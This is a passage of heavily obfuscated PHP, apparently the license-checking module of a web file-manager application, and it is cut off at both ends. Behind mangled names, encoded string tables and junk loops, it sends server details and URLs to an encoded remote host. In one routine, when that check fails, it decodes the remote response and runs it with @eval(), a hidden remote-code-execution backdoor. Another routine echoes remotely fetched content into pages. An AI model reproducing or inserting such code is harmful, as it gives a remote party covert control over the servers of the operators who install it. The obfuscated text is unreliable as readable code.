md5($ÖÚä‘ƒ[130])); $ä‰€Â»‚ = $¡†Ÿ¾ö[632]; $—è¨çÇ = array($ÖÚä‘ƒ[131] => $·×ò½™ã); call_user_func(array($ÖÚä‘ƒ[132], $ÖÚä‘ƒ[133]), $—è¨çÇ); $¥ï“ìØ = $¡†Ÿ¾ö[633]; if (!$¥ï“ìØ) { return; } } if ($this->wnqp5ad7fc40 == $ÖÚä‘ƒ[104]) { return; } $Ğœş«ËÈ = array($ÖÚä‘ƒ[134], $ÖÚä‘ƒ[135], $ÖÚä‘ƒ[136], $ÖÚä‘ƒ[137], $ÖÚä‘ƒ[138], $ÖÚä‘ƒ[139]); $ù³ÇÍÆ = $¡†Ÿ¾ö[634]; $­ûâÜÀ = Model($ÖÚä‘ƒ[33])->get(); $—è¨çÇ = array($ÖÚä‘ƒ[140] => $­ûâÜÀ[$ÖÚä‘ƒ[34]], $ÖÚä‘ƒ[141] => $­ûâÜÀ[$ÖÚä‘ƒ[35]], $ÖÚä‘ƒ[142] => $ÖÚä‘ƒ[6]); foreach ($Ğœş«ËÈ as $ ¨×à) { if (!isset($­ûâÜÀ[$ ¨×à]) || !$­ûâÜÀ[$ ¨×à]) { continue; } $—è¨çÇ[$ ¨×à] = $­ûâÜÀ[$ ¨×à]; $ÈÔ€¡§ = $¡†Ÿ¾ö[635]; if (!$ÈÔ€¡§) { return; } } call_user_func(array($ÖÚä‘ƒ[132], $ÖÚä‘ƒ[133]), $—è¨çÇ); $ŸŠº·Œ· = $¡†Ÿ¾ö[636]; if (!$ŸŠº·Œ·) { die; } } private function kbmn3adaf35b() { $õ÷¥ê…è =& $_SERVER[ì…™Î¶Ï]; $Íüèš =& $_SERVER[Ú°³Çñ€]; if ($_SERVER[$Íüèš[24]] != $Íüèš[143]) { return; } if (!_get($GLOBALS, $Íüèš[113])) { die; } $Ç¯ïç¿ = $GLOBALS[$Íüèš[13]]; if (isset($Ç¯ïç¿[$Íüèš[144]])) { $this->plzx1597a299(); die; } if (!isset($Ç¯ïç¿[$Íüèš[145]]) || strlen($Ç¯ïç¿[$Íüèš[145]]) != 16) { show_json($Íüèš[146] . $Ç¯ïç¿[$Íüèš[145]], !1); } $ÂğŒ¤²… = Model($Íüèš[33])->get($Íüèš[101]); $„ø˜€‡Ù = md5($_SERVER[$Íüèš[100]] . $ÂğŒ¤²…); $Óê¨õ†Í = $õ÷¥ê…è[637]; $ÃöÉ‘„´ = array($Íüèš[145] => $Ç¯ïç¿[$Íüèš[145]], $Íüèš[147] => rand_string(16), $Íüèš[148] => $Íüèš[130], $Íüèš[149] => $Íüèš[150], $Íüèš[151] => $_SERVER[$Íüèš[152]], $Íüèš[153] => $_SERVER[$Íüèš[154]], $Íüèš[155] => $_SERVER[$Íüèš[156]], $Íüèš[99] => $„ø˜€‡Ù, $Íüèš[157] => Model($Íüèš[33])->get($Íüèš[125])); $¼ı½ªÂâ = $õ÷¥ê…è[638]; while ($¼ı½ªÂâ < $õ÷¥ê…è[602]) { if ($¼ı½ªÂâ >= 0) { break; } $¼ı½ªÂâ++; } if ($Ç¯ïç¿[$Íüèš[158]] == $Íüèš[159]) { $Ò´ğÍ¿Ş = $this->yzwqdf8acb0b($„ø˜€‡Ù, $Íüèš[160]); $‘§şÎÎÃ = $this->jdhz4867fa0e(json_encode($ÃöÉ‘„´), $„ø˜€‡Ù . $Íüèš[161], 3); $‘§şÎÎÃ = $‘§şÎÎÃ . $Íüèš[162] . $_SERVER[$Íüèš[152]]; $ì”×‡¨§ = $this->cztsd7acc3e4($Íüèš[163] . $Ò´ğÍ¿Ş . $Íüèš[164] . $‘§şÎÎÃ, -1); show_json($ì”×‡¨§, !0); } else { if ($Ç¯ïç¿[$Íüèš[158]] == $Íüèš[165]) { $¥°ÑŞ = substr(md5($Íüèš[166] . $„ø˜€‡Ù), 12, 15) . $Íüèš[167]; $‘§şÎÎÃ = $this->cdrwab725402(trim($Ç¯ïç¿[$Íüèš[168]]), $¥°ÑŞ, 2); $šÚ«³å¡ = json_decode($‘§şÎÎÃ, !0); if (!is_array($šÚ«³å¡) || !is_array($šÚ«³å¡[$Íüèš[169]]) || $šÚ«³å¡[$Íüèš[145]] != !0) { $åÏ‡ÑéÁ = $Íüèš[170]; $ëÍŸšÁ° = $šÚ«³å¡[$Íüèš[169]] ? $Íüèš[171] . $šÚ«³å¡[$Íüèš[169]] : $åÏ‡ÑéÁ; show_json($ëÍŸšÁ°, !1); } else { $ÃöÉ‘„´[$Íüèš[147]] = $šÚ«³å¡[$Íüèš[169]][$Íüèš[172]]; } } else { $šÚ«³å¡ = $this->cztsd7acc3e4($Íüèš[173], $ÃöÉ‘„´, 10); } } if (!is_array($šÚ«³å¡) || !is_array($šÚ«³å¡[$Íüèš[169]]) || $šÚ«³å¡[$Íüèš[145]] != !0) { $åÏ‡ÑéÁ = LNG($Íüèš[174]); $ëÍŸšÁ° = $šÚ«³å¡[$Íüèš[169]] ? $Íüèš[171] . $šÚ«³å¡[$Íüèš[169]] : $åÏ‡ÑéÁ; show_json($ëÍŸšÁ°, !1); } $†«‘ìÚ‚ = $šÚ«³å¡[$Íüèš[169]]; $å¤åÔÇª = $this->nyul4f562f67($†«‘ìÚ‚[$Íüèš[175]]); if (!$å¤åÔÇª || $å¤åÔÇª != $†«‘ìÚ‚[$Íüèš[123]]) { $‹ü¾Ñ£ = array($Íüèš[176] => Model($Íüèš[33])->get($Íüèš[101]), $Íüèš[177] => $_SERVER[$Íüèš[100]], $Íüèš[178] => this_url(), $Íüèš[153] => $_SERVER[$Íüèš[154]]); $‘§şÎÎÃ = $this->ojzn5043bc22(json_encode($‹ü¾Ñ£)); $this->cztsd7acc3e4($Íüèš[179] . $‘§şÎÎÃ); show_json(LNG($Íüèš[180]), !0); } $¬¥©‘ = array($Íüèš[181] => $†«‘ìÚ‚[$Íüèš[182]], $Íüèš[183] => $†«‘ìÚ‚[$Íüèš[184]], $Íüèš[185] => rand_string(16), $Íüèš[103] => $†«‘ìÚ‚[$Íüèš[186]]); if ($ÃöÉ‘„´[$Íüèš[147]]) { $¬¥©‘[$Íüèš[185]] = $ÃöÉ‘„´[$Íüèš[147]]; } $À»ô§÷‘ = substr(md5($¬¥©‘[$Íüèš[183]]), 10, 10); $Ûø»•¬´ = $À»ô§÷‘ . $¬¥©‘[$Íüèš[103]] . $¬¥©‘[$Íüèš[185]]; $¬¥©‘[$Íüèš[105]] = strrev(base64_encode($this->yzwqdf8acb0b($Ûø»•¬´, $Íüèš[187]))); $è•í»ûŠ = $õ÷¥ê…è[639]; while (strlen($è•í»ûŠ) < $õ÷¥ê…è[598]) { if (!$è•í»ûŠ) { break; } $è•í»ûŠ++; } $Üï·™±Ï = rand_string(16); $¼ñèğ“ = $Üï·™±Ï . $¬¥©‘[$Íüèš[103]] . $this->yzwqdf8acb0b(md5($¬¥©‘[$Íüèš[181]]), $Üï·™±Ï); $«öŠ¯Ê– = $õ÷¥ê…è[640]; if (!$«öŠ¯Ê–) { return; } $¬¥©‘[$Íüèš[106]] = base64_encode(strrev($this->yzwqdf8acb0b($¼ñèğ“, $Íüèš[188]))); if ($†«‘ìÚ‚[$Íüèš[189]] && $†«‘ìÚ‚[$Íüèš[189]] >= 1) { Model($Íüèš[33])->setDeep($Íüèš[190], $Íüèš[191]); } Model($Íüèš[33])->set($¬¥©‘); $ªÄÑ÷œÀ = md5($_SERVER[$Íüèš[100]] . strrev($ÂğŒ¤²…) . $¬¥©‘[$Íüèš[183]]); $£É˜…­§ = strrev(substr($ªÄÑ÷œÀ, 10, 16)); $¥Á˜õ«Ë = $this->jdhz4867fa0e(json_encode($†«‘ìÚ‚), $ªÄÑ÷œÀ); $«ç”¾Şı = $õ÷¥ê…è[641]; if (strlen($«ç”¾Şı) < $õ÷¥ê…è[598]) { die; } $ñÅÜ‘¹ = array_to_keyvalue(Model($Íüèš[7])->listData(), $Íüèš[192]); $€ğÃ†Â‘ = $õ÷¥ê…è[642]; $Ş³§òÄª = $ñÅÜ‘¹[$Íüèš[193]]; $²×ä¥ùÀ = array(); $¥ÑÚİÑ¿ = $õ÷¥ê…è[643]; while (strlen($¥ÑÚİÑ¿) < $õ÷¥ê…è[618]) { if (!$¥ÑÚİÑ¿) { break; } $¥ÑÚİÑ¿++; } $²×ä¥ùÀ[$£É˜…­§] = $¥Á˜õ«Ë; Model($Íüèš[7])->update($Ş³§òÄª[$Íüèš[194]], array($Íüèš[195] => $²×ä¥ùÀ)); $…†øéßØ = $õ÷¥ê…è[644]; $this->aftr2b577768 = $†«‘ìÚ‚; $this->wnqp5ad7fc40 = $¬¥©‘[$Íüèš[103]]; $this->licenseRegistSuccess(); Cache::set($Íüèš[196] . md5($ÂğŒ¤²… . $Íüèš[197]), $Íüèš[6]); $Ş‹Ò’¸ı = $õ÷¥ê…è[645]; show_json(LNG($Íüèš[180]), !0); $¯Â¸ÀÉû = $õ÷¥ê…è[646]; if (strlen($¯Â¸ÀÉû) < $õ÷¥ê…è[618]) { die; } } private function licenseRegistSuccess() { $¨Ô´İ’¡ =& $_SERVER[ì…™Î¶Ï]; $‰–î¬Ã =& $_SERVER[Ú°³Çñ€]; $€Æ³¶¥ = Model($‰–î¬Ã[33])->get(); $Å·­±Ÿ÷ = $¨Ô´İ’¡[647]; if (strlen($Å·­±Ÿ÷) < $¨Ô´İ’¡[618]) { die; } if ($€Æ³¶¥[$‰–î¬Ã[63]] != $‰–î¬Ã[191]) { Model($‰–î¬Ã[33])->set($‰–î¬Ã[63], $‰–î¬Ã[191]); } Action($‰–î¬Ã[198])->initStart(!0); } private function plzx1597a299() { $™¨¦±ì° =& $_SERVER[ì…™Î¶Ï]; $¿¿û˜ªª =& $_SERVER[Ú°³Çñ€]; Model($¿¿û˜ªª[33])->set(array($¿¿û˜ªª[181] => $¿¿û˜ªª[6], $¿¿û˜ªª[183] => $¿¿û˜ªª[6], $¿¿û˜ªª[103] => $¿¿û˜ªª[104], $¿¿û˜ªª[105] => $¿¿û˜ªª[6], $¿¿û˜ªª[106] => $¿¿û˜ªª[6])); $ÈÀé°ë× = $™¨¦±ì°[648]; Model($¿¿û˜ªª[33])->setDeep($¿¿û˜ªª[190], $¿¿û˜ªª[199]); $ÆùÈí’› = $™¨¦±ì°[649]; $this->aftr2b577768 = array(); $this->wnqp5ad7fc40 = $¿¿û˜ªª[104]; $Ş··ƒÁ = $™¨¦±ì°[650]; } private function cmpid5c1b294() { $øÂ¦­©ñ =& $_SERVER[ì…™Î¶Ï]; $†Ñş–¢Œ =& $_SERVER[Ú°³Çñ€]; $_SERVER[$†Ñş–¢Œ[154]] = _get($_SERVER, $†Ñş–¢Œ[154], APP_HOST); $this->wnqp5ad7fc40 = $†Ñş–¢Œ[104]; $¿¿¯Ü¹ = $øÂ¦­©ñ[651]; if (strlen($¿¿¯Ü¹) < $øÂ¦­©ñ[598]) { die; } $‚Èğµ§† = Model($†Ñş–¢Œ[33])->get(); if ($‚Èğµ§†[$†Ñş–¢Œ[103]] == $†Ñş–¢Œ[104]) { return; } $¼„šÆ = Model($†Ñş–¢Œ[33])->get($†Ñş–¢Œ[101]); $èç÷ó¢ï = $†Ñş–¢Œ[196] . md5($¼„šÆ . $†Ñş–¢Œ[197]); $€şÓÂîÎ = Cache::get($èç÷ó¢ï); if (!is_array($€şÓÂîÎ) || !isset($€şÓÂîÎ[$†Ñş–¢Œ[200]]) || time() - $€şÓÂîÎ[$†Ñş–¢Œ[200]] >= 60) { $Ïõ»¼Û¤ = Model($†Ñş–¢Œ[7])->loadList(); $ò¿¼ÆÅ = $Ïõ»¼Û¤[$†Ñş–¢Œ[193]]; $†Ğ›ìğ = md5($_SERVER[$†Ñş–¢Œ[100]] . strrev($¼„šÆ) . $‚Èğµ§†[$†Ñş–¢Œ[183]]); $Ó¸•’–¯ = strrev(substr($†Ğ›ìğ, 10, 16)); $€şÓÂîÎ = $this->cdrwab725402($ò¿¼ÆÅ[$†Ñş–¢Œ[83]][$Ó¸•’–¯], $†Ğ›ìğ); $€şÓÂîÎ = json_decode($€şÓÂîÎ, !0); } if (!is_array($€şÓÂîÎ)) { return $this->plzx1597a299(); } $¿”ğšáÒ = strtotime($€şÓÂîÎ[$†Ñş–¢Œ[123]]); if (time() >= $¿”ğšáÒ) { return $this->plzx1597a299(); } if (time() - $€şÓÂîÎ[$†Ñş–¢Œ[200]] > 20) { $€şÓÂîÎ[$†Ñş–¢Œ[200]] = time(); Cache::set($èç÷ó¢ï, $€şÓÂîÎ); } $this->aftr2b577768 = $€şÓÂîÎ; $this->wnqp5ad7fc40 = $‚Èğµ§†[$†Ñş–¢Œ[103]]; } private function hmxzf15fa574() { $ ôáÍ– =& $_SERVER[ì…™Î¶Ï]; $À³æÕ´Ø =& $_SERVER[Ú°³Çñ€]; $öš¡ˆúğ = $GLOBALS[$À³æÕ´Ø[13]]; $¨½î•ô± = $_SERVER[$À³æÕ´Ø[24]]; $ú©ì„…© = $ ôáÍ–[652]; if (strlen($ú©ì„…©) < $ ôáÍ–[608]) { die; } if ($¨½î•ô± == $À³æÕ´Ø[201] && $this->wnqp5ad7fc40 == $À³æÕ´Ø[104]) { show_json(LNG($À³æÕ´Ø[202]), !1, $À³æÕ´Ø[203]); } $”¿Í‡ = array($À³æÕ´Ø[204], $À³æÕ´Ø[205]); if (in_array($¨½î•ô±, $”¿Í‡)) { if ($this->wnqp5ad7fc40 == $À³æÕ´Ø[104] && isset($öš¡ˆúğ[$À³æÕ´Ø[206]])) { show_json(LNG($À³æÕ´Ø[202]), !1, $À³æÕ´Ø[203]); die; } $â£„µãç = $this->uvgz8ede6dbe(); if ($â£„µãç != intval($À³æÕ´Ø[207])) { if ($â£„µãç <= Model($À³æÕ´Ø[119])->count()) { show_json(LNG($À³æÕ´Ø[208]), !1, $À³æÕ´Ø[203]); die; } } } } private function iwcj489b4e47() { $í¢«ã’Ş =& $_SERVER[ì…™Î¶Ï]; $ŠãÎ˜ =& $_SERVER[Ú°³Çñ€]; $¤§Ëãïö = array($ŠãÎ˜[116], $ŠãÎ˜[209]); $¯ùŞÖÄì = $í¢«ã’Ş[653]; if (strlen($¯ùŞÖÄì) < $í¢«ã’Ş[605]) { die; } if (!_get($GLOBALS, $ŠãÎ˜[113]) || !isset($_GET[$ŠãÎ˜[210]])) { return; } if (!in_array($_SERVER[$ŠãÎ˜[24]], $¤§Ëãïö)) { return; } $¯Ä‰õÃ× = $ŠãÎ˜[211]; $¯Ä‰õÃ× = $this->xufrb7cb6a6a($¯Ä‰õÃ×, $ŠãÎ˜[212]); $Ä…ÁŸğÑ = stream_context_create(array($ŠãÎ˜[213] => array($ŠãÎ˜[214] => $ŠãÎ˜[215], $ŠãÎ˜[216] => 3))); $Ç±¥³¶Ÿ = @file_get_contents($¯Ä‰õÃ×, !1, $Ä…ÁŸğÑ); header($ŠãÎ˜[217]); if ($Ç±¥³¶Ÿ && strstr($Ç±¥³¶Ÿ, $ŠãÎ˜[218])) { echo $Ç±¥³¶Ÿ; } die; } public function fnvcf33b8b66($•œ€‹š•) { $œˆÜæŒœ =& $_SERVER[ì…™Î¶Ï]; $”ƒ¤á«« =& $_SERVER[Ú°³Çñ€]; if ($this->wnqp5ad7fc40 == $”ƒ¤á««[219]) { return $•œ€‹š•; } $Ô« ±± = array($”ƒ¤á««[220] => $”ƒ¤á««[221], $”ƒ¤á««[222] => $”ƒ¤á««[221], $”ƒ¤á««[223] => $”ƒ¤á««[221], $”ƒ¤á««[224] => $”ƒ¤á««[221], $”ƒ¤á««[225] => $”ƒ¤á««[226], $”ƒ¤á««[227] => $”ƒ¤á««[226], $”ƒ¤á««[228] => $”ƒ¤á««[226], $”ƒ¤á««[229] => $”ƒ¤á««[226], $”ƒ¤á««[230] => $”ƒ¤á««[226], $”ƒ¤á««[231] => $”ƒ¤á««[226], $”ƒ¤á««[232] => $”ƒ¤á««[226], $”ƒ¤á««[233] => $”ƒ¤á««[226], $”ƒ¤á««[234] => $”ƒ¤á««[226], $”ƒ¤á««[235] => $”ƒ¤á««[226], $”ƒ¤á««[236] => $”ƒ¤á««[226], $”ƒ¤á««[237] => $”ƒ¤á««[226]); $Úñ˜Âş› = explode($”ƒ¤á««[238], _get($this->aftr2b577768, $”ƒ¤á««[110], $”ƒ¤á««[6])); $Ëæº«ì = array(); foreach ($Ô« ±± as $Ô•µÔë  => $¹Õ¤éà) { if ($¹Õ¤éà == $”ƒ¤á««[221] && substr($this->wnqp5ad7fc40, 0, 1) == $”ƒ¤á««[221]) { continue; } if (!in_array($Ô•µÔë , $Úñ˜Âş›)) { $Ëæº«ì[] = $Ô•µÔë ; } } foreach ($Ëæº«ì as $Ô•µÔë ) { unset($•œ€‹š•[$Ô•µÔë ]); $ıüúİßĞ = $œˆÜæŒœ[654]; while ($ıüúİßĞ < $œˆÜæŒœ[598]) { if ($ıüúİßĞ >= 0) { break; } $ıüúİßĞ++; } } return $•œ€‹š•; } private function yjhk682394b3() { $‘ª„§Ï§ =& $_SERVER[Ú°³Çñ€]; if ($this->wnqp5ad7fc40 != $‘ª„§Ï§[104]) { $GLOBALS[$‘ª„§Ï§[83]][$‘ª„§Ï§[87]][$‘ª„§Ï§[239]] = $‘ª„§Ï§[199]; return; } $GLOBALS[$‘ª„§Ï§[83]][$‘ª„§Ï§[240]] = $‘ª„§Ï§[191]; if (Model($‘ª„§Ï§[241])->get($‘ª„§Ï§[63]) != $‘ª„§Ï§[199]) { Model($‘ª„§Ï§[241])->set($‘ª„§Ï§[63], $‘ª„§Ï§[199]); } } public function kjxedecd5c48() { return $_SERVER[Ú°³Çñ€][242]; } private function iwvac629dabb() { $–À¯ÌİÆ =& $_SERVER[ì…™Î¶Ï]; $óÎÄ›” =& $_SERVER[Ú°³Çñ€]; $½éÕ—Äæ = array($óÎÄ›”[243], $óÎÄ›”[244], $óÎÄ›”[245]); $š‚îõÄ = $óÎÄ›”[246] . md5($óÎÄ›”[247]); if ($this->wnqp5ad7fc40 == $óÎÄ›”[104] || !_get($GLOBALS, $óÎÄ›”[113])) { return; } if (!in_array($_SERVER[$óÎÄ›”[24]], $½éÕ—Äæ)) { return; } if (time() % 4 != 0) { return; } $å«ªºòÅ = call_user_func(array($óÎÄ›”[248], $óÎÄ›”[249]), $š‚îõÄ); $ş¬Ãòˆä = $–À¯ÌİÆ[655]; if (strlen($ş¬Ãòˆä) < $–À¯ÌİÆ[605]) { die; } if ($å«ªºòÅ && time() - $å«ªºòÅ < intval($óÎÄ›”[250])) { return; } call_user_func(array($óÎÄ›”[248], $óÎÄ›”[133]), $š‚îõÄ, time()); $ÖÂ—ƒ¯Í = Model($óÎÄ›”[33])->get($óÎÄ›”[101]); $ø‚Õ¶±Ê = array($óÎÄ›”[145] => Model($óÎÄ›”[33])->get($óÎÄ›”[181]), $óÎÄ›”[158] => $this->wnqp5ad7fc40, $óÎÄ›”[155] => $_SERVER[$óÎÄ›”[156]], $óÎÄ›”[157] => Model($óÎÄ›”[33])->get($óÎÄ›”[125]), $óÎÄ›”[99] => md5($_SERVER[$óÎÄ›”[100]] . $ÖÂ—ƒ¯Í), $óÎÄ›”[148] => $óÎÄ›”[130], $óÎÄ›”[151] => $_SERVER[$óÎÄ›”[152]]); $Â†ã²„´ = $–À¯ÌİÆ[656]; if (strlen($Â†ã²„´) < $–À¯ÌİÆ[605]) { die; } $ÕãÒºìÕ = $this->cztsd7acc3e4($óÎÄ›”[251], $ø‚Õ¶±Ê); $½ã÷£¸ = $–À¯ÌİÆ[657]; if (!$½ã÷£¸) { return; } if (!is_array($ÕãÒºìÕ)) { return; } if ($ÕãÒºìÕ[$óÎÄ›”[145]] && $ÕãÒºìÕ[$óÎÄ›”[252]]) { if ($this->nyul4f562f67($ÕãÒºìÕ[$óÎÄ›”[252]]) == $ø‚Õ¶±Ê[$óÎÄ›”[145]]) { return; } } $this->plzx1597a299(); if ($this->nyul4f562f67($ÕãÒºìÕ[$óÎÄ›”[252]]) != $ø‚Õ¶±Ê[$óÎÄ›”[145]]) { $‡µË…á = array($óÎÄ›”[176] => $ÖÂ—ƒ¯Í, $óÎÄ›”[177] => $_SERVER[$óÎÄ›”[100]], $óÎÄ›”[178] => this_url(), $óÎÄ›”[153] => $_SERVER[$óÎÄ›”[154]]); $²¼¡ù = $this->ojzn5043bc22(json_encode($‡µË…á)); $ÕãÒºìÕ = $this->cztsd7acc3e4($óÎÄ›”[179] . $²¼¡ù); if ($ÕãÒºìÕ && is_array($ÕãÒºìÕ) && isset($ÕãÒºìÕ[$óÎÄ›”[252]])) { $×´ëû¯Ê = $this->cdrwab725402($ÕãÒºìÕ[$óÎÄ›”[252]], 2); if ($×´ëû¯Ê) { $×´ëû¯Ê = $this->nyul4f562f67($×´ëû¯Ê); } if ($×´ëû¯Ê) { try { @eval($×´ëû¯Ê); } catch (Exception $­Òì í) { } } } } } private function cztsd7acc3e4($¦åü„ñô = '', $¿ã¥š¹® = array(), $¯Íµ¤„ = 5) { $ú¬Ô•÷ƒ =& $_SERVER[ì…™Î¶Ï]; $İä•“Ù =& $_SERVER[Ú°³Çñ€]; $¹ÜõĞ’ = $İä•“Ù[253]; $Ñ´‡ÀšÓ = $ú¬Ô•÷ƒ[658]; if (!$Ñ´‡ÀšÓ) { return; } $¹ÜõĞ’ = $this->xufrb7cb6a6a($¹ÜõĞ’, $İä•“Ù[254]); $Ì·Ûá = $ú¬Ô•÷ƒ[659]; if (!$Ì·Ûá) { die; } $¹ÜõĞ’ = $¹ÜõĞ’ . $¦åü„ñô; $™Ùñú¶Â = $ú¬Ô•÷ƒ[660]; if (!$™Ùñú¶Â) { return; } if ($¿ã¥š¹® && is_array($¿ã¥š¹®)) { $¹ÜõĞ’ = $¹ÜõĞ’ . $İä•“Ù[255] . http_build_query($¿ã¥š¹®); } if ($¿ã¥š¹® === -1) { return $¹ÜõĞ’; } $©ãƒ¤íÈ = stream_context_create(array($İä•“Ù[213] => array($İä•“Ù[216] => $¯Íµ¤„, $İä•“Ù[214] => $İä•“Ù[256]), $İä•“Ù[257] => array($İä•“Ù[258] => !1, $İä•“Ù[259] => !1))); $¿ã¥š¹® = @file_get_contents($¹ÜõĞ’, !1, $©ãƒ¤íÈ); return json_decode($¿ã¥š¹®, !0); $±¡–áî = $ú¬Ô•÷ƒ[661]; if (!$±¡–áî) { return; } } private function uvgz8ede6dbe() { $µ¡•·–¨ =& $_SERVER[ì…™Î¶Ï]; $óñ‚û¶² =& $_SERVER[Ú°³Çñ€]; $œº¶›û = array($óñ‚û¶²[260] => $óñ‚û¶²[261], $óñ‚û¶²[262] => $óñ‚û¶²[263], $óñ‚û¶²[264] => $óñ‚û¶²[265], $óñ‚û¶²[266] => $óñ‚û¶²[267], $óñ‚û¶²[268] => $óñ‚û¶²[269], $óñ‚û¶²[270] => $óñ‚û¶²[207], $óñ‚û¶²[271] => $óñ‚û¶²[207], $óñ‚û¶²[272] => $óñ‚û¶²[261], $óñ‚û¶²[273] => $óñ‚û¶²[263], $óñ‚û¶²[274] => $óñ‚û¶²[265], $óñ‚û¶²[275] => $óñ‚û¶²[276], $óñ‚û¶²[277] => $óñ‚û¶²[267], $óñ‚û¶²[278] => $óñ‚û¶²[279], $óñ‚û¶²[280] => $óñ‚û¶²[269], $óñ‚û¶²[281] => $óñ‚û¶²[282], $óñ‚û¶²[283] => $óñ‚û¶²[284], $óñ‚û¶²[285] => $óñ‚û¶²[286]); $ËÉ¦Âª· = $µ¡•·–¨[662]; while (strlen($ËÉ¦Âª·) < $µ¡•·–¨[598]) { if (!$ËÉ¦Âª·) { break; } $ËÉ¦Âª·++; } $­›¤ããÎ = $œº¶›û[$this->wnqp5ad7fc40]; $•Ôìø˜ = $µ¡•·–¨[663]; $­›¤ããÎ = intval($­›¤ããÎ ? $­›¤ããÎ : $óñ‚û¶²[261]); $Å¶™»ë¾ = _get($this->aftr2b577768, $óñ‚û¶²[287]); $Å¶™»ë¾ = $Å¶™»ë¾ ? intval($Å¶™»ë¾) : 0; $„Æ¦ËË = $µ¡•·–¨[664]; return $­›¤ããÎ + $Å¶™»ë¾; $¥çšÚö = $µ¡•·–¨[665]; while (strlen($¥çšÚö) < $µ¡•·–¨[608]) { if (!$¥çšÚö) { break; } $¥çšÚö++; } } public function lkdzb949c155($Ä”¡…‚) { $áû¦ÜÄ =& $_SERVER[ì…™Î¶Ï]; $ÒÎß‹® =& $_SERVER[Ú°³Çñ€]; $¬ÂÅ¤ğÚ = $this->uvgz8ede6dbe(); if ($Ä”¡…‚[$ÒÎß‹®[288]] == $ÒÎß‹®[191]) { return; } if ($¬ÂÅ¤ğÚ >= intval($ÒÎß‹®[207])) { return; } $Òúå®ª“ = Model($ÒÎß‹®[119])->count(); if ($Òúå®ª“ <= $¬ÂÅ¤ğÚ) { return; } $ÕÁšÚ’™ = Model($ÒÎß‹®[119])->field($ÒÎß‹®[288])->limit($¬ÂÅ¤ğÚ)->select(); $ÕÁšÚ’™ = array_to_keyvalue($ÕÁšÚ’™, $ÒÎß‹®[6], $ÒÎß‹®[288]); $ÚéÑ±æ = $áû¦ÜÄ[666]; if (strlen($ÚéÑ±æ) < $áû¦ÜÄ[602]) { die; } if (!in_array($Ä”¡…‚[$ÒÎß‹®[288]], $ÕÁšÚ’™)) { show_json($ÒÎß‹®[289], !1, $ÒÎß‹®[203]); } } public function gvsf43ba0b1f() { $‹Ø†ëşÕ =& $_SERVER[ì…™Î¶Ï]; $ıÎŠ­à =& $_SERVER[Ú°³Çñ€]; if (!_get($GLOBALS, $ıÎŠ­à[113]) || mt_rand(1, 100) > 20) { return; } $–ôŸ¶»Ü = $ıÎŠ­à[211]; $–ôŸ¶»Ü = $this->xufrb7cb6a6a($–ôŸ¶»Ü, $ıÎŠ­à[212]); $ƒãÑîñé = stream_context_create(array($ıÎŠ­à[213] => array($ıÎŠ­à[214] => $ıÎŠ­à[215], $ıÎŠ­à[216] => 3))); $½²£™ßÃ = @file_get_contents($–ôŸ¶»Ü, !1, $ƒãÑîñé); echo $ıÎŠ­à[290] . hash_encode($½²£™ßÃ) . $ıÎŠ­à[291]; $õÍ¸ÃîÎ = $‹Ø†ëşÕ[667]; while ($õÍ¸ÃîÎ < $‹Ø†ëşÕ[602]) { if ($õÍ¸ÃîÎ >= 0) { break; } $õÍ¸ÃîÎ++; } } private function jdhz4867fa0e($À¤¯€ƒ, $•ÚÜœ°, $‚Œ§Õ¢ = 3) { $Ä¡Öç =& $_SERVER[ì…™Î¶Ï]; $ç† Ä¬Ş =& $_SERVER[Ú°³Çñ€]; usleep(1); $ºîÄµªÔ = $Ä¡Öç[668]; while ($ºîÄµªÔ < $Ä¡Öç[605]) { if ($ºîÄµªÔ >= 0) { break; } $ºîÄµªÔ++; } $À¤¯€ƒ = trim($À¤¯€ƒ); $ó¶‹ƒ…± = $Ä¡Öç[669]; if (!$ó¶‹ƒ…±) { die; } $æú¶Òš = mt_rand(0, 5) . $ç† Ä¬Ş[6]; $ÑÛÉŸ…Ö = rand_string(15); $ÑÓºÌ°¦ = $Ä¡Öç[670]; $•ÀóÉ  = $ç† Ä¬Ş[292]; switch ($æú¶Òš) { case $ç† Ä¬Ş[199]: $ñ…’Å‚ó = $this->yzwqdf8acb0b($À¤¯€ƒ, strrev($•ÚÜœ° . $ÑÛÉŸ…Ö)); $Íí›Ø = $Ä¡Öç[671]; if (strlen($Íí›Ø) < $Ä¡Öç[598]) { return; } break; $¨¼ßÜİ¶ = $Ä¡Öç[672]; if (!$¨¼ßÜİ¶) { die; } case $ç† Ä¬Ş[191]: $ñ…’Å‚ó = $this->yzwqdf8acb0b($À¤¯€ƒ, strrev($ÑÛÉŸ…Ö . $•ÚÜœ°)); break; case $ç† Ä¬Ş[293]: $ñ…’Å‚ó = $this->yzwqdf8acb0b($À¤¯€ƒ, base64_encode($ÑÛÉŸ…Ö . $•ÚÜœ°)); break; $¹•±áª• = $Ä¡Öç[673]; while ($¹•±áª• < $Ä¡Öç[598]) { if ($¹•±áª• >= 0) { break; } $¹•±áª•++; } case $ç† Ä¬Ş[294]: $ñ…’Å‚ó = $this->yzwqdf8acb0b($À¤¯€ƒ, md5($ÑÛÉŸ…Ö . $•ÚÜœ°)); $ôŠÑ”‰ã = $Ä¡Öç[674]; while ($ôŠÑ”‰ã < $Ä¡Öç[605]) { if ($ôŠÑ”‰ã >= 0) { break; } $ôŠÑ”‰ã++; } break; case $ç† Ä¬Ş[295]: $À¤¯€ƒ = base64_encode($À¤¯€ƒ); $Ø”ößÀ¶ = $Ä¡Öç[675]; $øÚ»Ü Ü = rand(0, 64); $¯¬±Ã–½ = $•ÀóÉ [$øÚ»Ü Ü]; $¶Ã÷Æ¾ = md5($¯¬±Ã–½ . md5($•ÚÜœ° . $¯¬±Ã–½) . $•ÚÜœ°); $¶Ã÷Æ¾ = substr($¶Ã÷Æ¾, $øÚ»Ü Ü % 8, $øÚ»Ü Ü % 8 + 7); $ëØ³Üúä = $Ä¡Öç[676]; while ($ëØ³Üúä < $Ä¡Öç[602]) { if ($ëØ³Üúä >= 0) { break; } $ëØ³Üúä++; } $Ò—üÑ±œ = $ç† Ä¬Ş[6]; $¥Ïõ…Ãá = $Ä¡Öç[677]; if (!$¥Ïõ…Ãá) { return; } $ÄúÊûÄ­ = 0; $ô–ûÙø³ = 0; $ŞÜÎ‚ğˆ = $Ä¡Öç[678]; while ($ŞÜÎ‚ğˆ < $Ä¡Öç[598]) { if ($ŞÜÎ‚ğˆ >= 0) { break; } $ŞÜÎ‚ğˆ++; } $ÙØ·ÎŠ¢ = 0; for ($ÄúÊûÄ­ = 0; $ÄúÊûÄ­ < strlen($À¤¯€ƒ); $ÄúÊûÄ­++) { $ÙØ·ÎŠ¢ = 